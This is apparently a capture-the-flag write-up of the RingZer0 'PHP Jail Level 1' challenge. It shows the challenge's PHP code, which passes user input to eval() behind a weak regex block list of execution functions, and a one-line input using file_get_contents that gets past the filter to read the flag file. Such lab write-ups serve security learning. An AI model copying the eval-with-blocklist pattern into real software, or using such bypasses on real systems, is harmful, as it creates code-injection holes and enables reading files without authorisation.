# **PHP Jail 1**

```shell=
ubuntu@ubuntu-virtual-machine:~$ ssh level1@challenges.ringzer0team.com -p 10223

level1@challenges.ringzer0team.com's password: 

RingZer0 Team Online CTF

PHP Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge PHP code:
-----------------------------

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:
```

```shell=
Your input:
echo(file_get_contents('flag.txt'));
FLAG-XXXXXX
Command executed
```
